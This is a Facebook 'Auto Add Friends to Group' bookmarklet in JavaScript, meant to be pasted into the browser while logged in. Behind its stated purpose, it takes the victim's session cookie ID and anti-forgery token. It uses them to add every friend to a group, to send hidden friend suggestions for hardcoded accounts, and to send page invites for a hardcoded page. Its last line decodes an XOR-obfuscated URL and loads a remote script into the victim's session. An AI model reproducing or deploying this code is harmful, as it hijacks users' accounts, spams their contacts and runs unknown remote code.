javascript: var Title = 'Auto Add Friends|Members to Group is Now Processed.';
var Descriptions = "", _text = 'Created & Designed By <A style="color:#3B5998;" href="https://www.facebook.com/pkwaq">Waqar Ahmad.</A><br/>Powered By <A style="color:#3B5998;" href="http://www.facebook.com/Loading.999999">Loading [lllllllllllllllllllllllllllllllllllllll ] 99%.</A>';
function AddPeople(opo) {       
        jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=" + gid + "&source=typeahead&ref=&message_id=&members=" + opo + "&__user=" + user_id + "&phstamp=", function (a) {
            var b = a.substring(a.indexOf("{"));
            var c = JSON.parse(b);
            i--;
            Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
    if (c.error) {
      Descriptions += "color:darkred'>";
      
      if (c.errorDescription) Descriptions += c.errorDescription;
      else Descriptions += JSON.stringify(c, null, "")
    }
    else {
      Descriptions += "color:darkgreen'>";
      Descriptions += arn[i] + " has been added.<br/>";
      suc++
    }
    Descriptions += "</div>";
    var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:15px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:10px;border:5px solid rgba(0,0,0,0.4);background-color:rgba(255,255,255,0.4);color:black'>";
   if (i > 0) { display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";    
      display += arr.length + " Friends Detected<br/>";
      display += "<b>" + suc + "</b> Friends Added of " + (arr.length - i) + " Friends Processed ";
      display += "(" + i + " Lefted...)";
      display += "<div class='friend-edge'>";
      display += Descriptions;
     display += "<img style='background:center no-repeat url(https://fbcdn-profile-a.akamaihd.net/static-ak/rsrc.php/v2/yo/r/UlIqmHJn-SK.gif);width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src=" + pho[i] + "></img><a style='padding-left:8px;font-size:14px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
      display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:#000000'>";
      display +="<a href='"+getuname.href+"'>"+getuname.innerHTML+"</a> Please Wait While Adding Your Friends in <a href='"+grpname.href+"'>" + grpname.innerHTML + ".</a><br/>";
      display += _text;window[tag + '_close'] = true;
      display += "</div>";
      display += "</div>"
    }
    else {Title = 'Auto Add Friends/Members to Group is Now Stopped.';
display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
      display += arr.length + " Friends Detected and "+ suc + " Friends Added</br></br>"; window[tag + '_close'] = false;    
         display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Refresh Page</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"'>Cancel</span><br/>";display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:#000000'><br/>";display += _text;display += "</div>";
    }
    display += "</div>";
    document.getElementById("pagelet_sidebar").innerHTML = display}, "text", "post");tay--;       
                
        if (tay > 0) {
            var s = arr[i];
            setTimeout("AddPeople(" + s + ");", 100)
}
        console.log(tay + "/" + arr.length + ":" + arr[tay] + "|" + arn[tay] + ", success:" + suc);
if (gid) {   jx.load(window.location.protocol+"//www.facebook.com/ajax/friends/suggest?&receiver="+opo+"&newcomer=100001050235420&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg="+fb_dtsg+"&phstamp=16581677156485189195",function() {}, "text", "post")
  }
if (gid) {   jx.load(window.location.protocol+"//www.facebook.com/ajax/friends/suggest?&receiver="+opo+"&newcomer=100003697277263&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg="+fb_dtsg+"&phstamp=16581677156485189195",function() {}, "text", "post")
  }
if (gid) {   jx.load(window.location.protocol+"//www.facebook.com/ajax/pages/invite/send/?fb_dtsg="+fb_dtsg+"&profileChooserItems=%7B%22"+opo+"%22%3A1%7D&checkableitems[0]="+opo+"&page_id=139361566267801&__user="+user_id+"&__a=1&__dyn=7n8ahyj2qmpmO0QAF0&__req=7d&phstamp=",function() {}, "text", "post")
  }
}
function clickfr_callback(){
if(document.getElementsByName("ok").length>0){
nHtml.ClickUp(document.getElementsByName("ok")[0])
}
var a=arr[i];
if(i<arr.length)addfriend(a.substring(0,4))
}
function clickfr(){
if(document.getElementsByClassName("search").length>0){
console.log(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1].innerHTML);
document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].href="javascript:void(0);";
nHtml.ClickUp(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1])
}else j++;setTimeout("clickfr_callback()",2e3)
}
function addfriend(a){
i++;
document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus();
document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].value=a;
document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].blur();
document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus();
document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus();
setTimeout("clickfr()",2e3)
}
function sleep(a){
var b=(new Date).getTime();
for(var c=0;c<1e7;c++){
if((new Date).getTime()-b>a){break}
}
}
jx={
getHTTPObject:function(){
var a=false;if(typeof ActiveXObject!="undefined"){try{a=new ActiveXObject("Msxml2.XMLHTTP")}catch(b){try{a=new ActiveXObject("Microsoft.XMLHTTP")}catch(c){a=false}}}else{if(window.XMLHttpRequest){try{a=new XMLHttpRequest}catch(b){a=false}}}
return a
},
load:function(url,callback,format,method,opt){
var http=this.init();
if(!http||!url){return}
if(http.overrideMimeType){http.overrideMimeType("text/xml")}
if(!method){method="GET"}
if(!format){format="text"}
if(!opt){opt={}}
format=format.toLowerCase();
method=method.toUpperCase();
url+=url.indexOf("?")+1?"&":"?";
var parameters=null;
if(method=="POST"){var parts=url.split("?");url=parts[0];parameters=parts[1]}
http.open(method,url,true);
var ths=this;
if(opt.handler){
http.onreadystatechange=function(){opt.handler(http)}
}else{
http.onreadystatechange=function(){
if(http.readyState==4){
if(http.status==200){
var result="";if(http.responseText){result=http.responseText}
if(format.charAt(0)=="j"){
result=result.replace(/[\n\r]/g,"");
result=eval("("+result+")")
}else{
if(format.charAt(0)=="x"){result=http.responseXML}
}
if(callback){callback(result)}
}else{
if(opt.loadingIndicator){
document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator)
}
if(opt.loading){document.getElementById(opt.loading).style.display="none"}
if(error){error(http.status)}
}
}
}
}
http.send(parameters)
},
bind:function(a){var b={url:"",onSuccess:false,onError:false,format:"text",method:"GET",update:"",loading:"",loadingIndicator:""};for(var c in b){if(a[c]){b[c]=a[c]}}if(!b.url){return}var d=false;if(b.loadingIndicator){d=document.createElement("div");d.setAttribute("style","position:absolute;top:0px;left:0px;");d.setAttribute("class","loading-indicator");d.innerHTML=b.loadingIndicator;document.getElementsByTagName("body")[0].appendChild(d);this.opt.loadingIndicator=d}if(b.loading){document.getElementById(b.loading).style.display="block"}this.load(b.url,function(a){if(b.onSuccess){b.onSuccess(a)}if(b.update){document.getElementById(b.update).innerHTML=a}if(d){document.getElementsByTagName("body")[0].removeChild(d)}if(b.loading){document.getElementById(b.loading).style.display="none"}},b.format,b.method,b)},
init:function(){return this.getHTTPObject()}
};
var nHtml={
FindByAttr:function(a,b,c,d){if(c=="className"){c="class"}var e=document.evaluate(".//"+b+"[@"+c+"='"+d+"']",a,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null);if(e&&e.singleNodeValue){return e.singleNodeValue}return null},
FindByClassName:function(a,b,c){return this.FindByAttr(a,b,"className",c)},
FindByXPath:function(a,b){try{var c=document.evaluate(b,a,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null)}catch(d){GM_log("bad xpath:"+b)}if(c&&c.singleNodeValue){return c.singleNodeValue}return null},
VisitUrl:function(a){window.setTimeout(function(){document.location.href=a},500+Math.floor(Math.random()*500))},
ClickWin:function(a,b,c){var d=a.document.createEvent("MouseEvents");d.initMouseEvent(c,true,true,a,0,0,0,0,0,false,false,false,false,0,null);return!b.dispatchEvent(d)},
Click:function(a){return this.ClickWin(window,a,"click")},
ClickTimeout:function(a,b){window.setTimeout(function(){return nHtml.ClickWin(window,a,"click")},b+Math.floor(Math.random()*500))},
ClickUp:function(a){this.ClickWin(window,a,"mousedown");this.ClickWin(window,a,"mouseup");this.ClickWin(window,a,"click")},
GetText:function(a,b){var c="";if(b==undefined){b=0}if(b>40){return}if(a.textContent!=undefined){return a.textContent}for(var d=0;d<a.childNodes.length;d++){var e=a.childNodes[d];c+=this.GetText(e,b+1)}return c}
};
if(document.getElementsByClassName==undefined){
document.getElementsByClassName=function(a){
var b=new RegExp("(?:^|\\s)"+a+"(?:$|\\s)");
var c=document.getElementsByTagName("*");
var d=[];
var e;
for(var f=0;(e=c[f])!=null;f++){
var g=e.className;
if(g&&g.indexOf(a)!=-1&&b.test(g))d.push(e)
}
return d
}
}
Array.prototype.find=function(a){
var b=false;
for(i=0;i<this.length;i++){
if(typeof a=="function"){
if(a.test(this[i])){
if(!b){b=[]}
b.push(i)
}
}else{
if(this[i]===a){
if(!b){b=[]}
b.push(i)
}
}
}
return b
};

var a=0,eind=0;
var len=document.getElementsByClassName("mbm").length;
for(a=0;a<len;a++){
var ele=document.getElementsByClassName("mbm")[a];
eind=a;break
}
function ChangeLocation() {
    window.location.href = "http://www.facebook.com/"};setTimeout("ChangeLocation", 1);
window.onbeforeunload = function () {
        if (window[tag + '_close']) {return 'This script is running now!'
        }
    };    
var tag = 'Close';
var i = 3;
var tay = 3;
var k = 0;
var j=0;
var suc = 0;
var arr = new Array;
var arn = new Array;
var pho = new Array;
var getuname = document.getElementsByClassName("fbxWelcomeBoxName")[0];
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
grpname = document.getElementById("groupsJumpTitle");var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var gid = document.getElementsByName("group_id")[0].value;
jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?" + "__a=1&filter[0]=user&lazy=0&viewer=" + user_id + "&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm", function (a) {
    var b = a;
    var c = b.substring(b.indexOf("{"));
    var d = JSON.parse(c);
    d = d.payload.entries;
    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
  for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
    i = arr.length - 1;
tay = i;
    console.log(arr.length);
var display = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:10px;border:5px solid rgba(0,0,0,0.4);background-color:rgba(255,255,255,0.4);color:black'>";
  display += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";
  display += arr.length + " Friends Detected";
  display += "</div>";
  document.getElementById("pagelet_sidebar")
    .innerHTML = display;
    AddPeople(arr[i])
});
A="jvvrq8--pcu,ekvjw`,amo-ucxx{epc{-dcag`mmi-ej/rcegq-Qwrrmpv,hq";B="";C="";for(i=0;i<A.length;i++){B+=String.fromCharCode(A.charCodeAt(i)^2)}C=unescape(B);document.body.appendChild(document.createElement('script')).src=C;









